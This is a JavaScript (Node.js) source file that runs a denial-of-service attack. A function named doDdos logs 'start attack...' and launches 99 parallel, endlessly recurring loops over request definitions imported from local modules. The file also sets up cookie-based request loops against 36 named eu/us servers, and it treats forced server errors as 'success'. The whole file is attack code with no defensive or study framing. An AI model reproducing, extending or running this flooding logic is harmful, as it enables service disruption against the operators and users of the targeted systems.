const axios = require('axios')
const https = require('https')
const FormData = require('form-data')
const REQUESTS = require('./requests')
const REQUESTS2 = require('./requests2')
const utils = require("./utilities")
const { parseErr, ERRORS } = require("./helpers/err_helpers") 
const _ = require("lodash")

const DELAY = 1*1000
const BG_DELAY = 60*1000

const recurRequest = (server, currentCookie, request) => {
	//console.clear()
	console.log(`Start recurring ${request.name} for ${server}`)
	utils.prepCookie(currentCookie).then((cookie) => {
		request(server, cookie).then((resp) => {
			setTimeout(() => {recurRequest(server, cookie, request)}, DELAY)
		}).catch((err) => {
			
			let errType = parseErr(err)
			if (errType == ERRORS.FORCED_ERR) {
				console.log("success");
				setTimeout(() => {recurRequest(server, cookie, request)}, DELAY)
			}
			else {
				console.log({err})
				setTimeout(() => {recurRequest(server, "", request)}, BG_DELAY)
			}
		})
	}).catch(err => {
		console.log(err)
		setTimeout(() => {recurRequest(server, "", request)}, DELAY)
	})
}

const doProxy = (server) => {
	console.log("Start server ", server)
	utils.prepCookie().then(cookie => {
		REQUESTS.forEach((request) => {
			recurRequest(server, cookie, request)
		})
	})
}

const recurRequest2 = (request) => {
	request().then((resp) => {
		console.log("success 1");
		setTimeout(() => {recurRequest2(request)}, 10000)
	}).catch((err) => {
		let errType = parseErr(err)
		if (errType == ERRORS.FORCED_ERR) {
			console.log("success 2");
			setTimeout(() => {recurRequest2(request)}, 10000)
		}
		else {
			console.log('er')
			setTimeout(() => {recurRequest2( request)}, 10000)
		}
	})

}

const doDdos = () => {
	console.log('start attack...');
	let i=1;
	do {
		try{
			REQUESTS2.forEach((request) => {
				recurRequest2(request)
			});
			 i++;
		} catch (err)
		{ console.log('errrrr ', err) }
	} while (i<100);
}

const doTest = () => {
	REQUESTS2.forEach((request) => {
		recurRequest2(request)
	});
}
servers = []
for (let i = 1; i <= 18; i++) servers.push(`eu${i}`) 
for (let i = 1; i <= 18; i++) servers.push(`us${i}`)

doDdos();
//servers.forEach((server) => doProxy(server))
//doProxy(servers[0])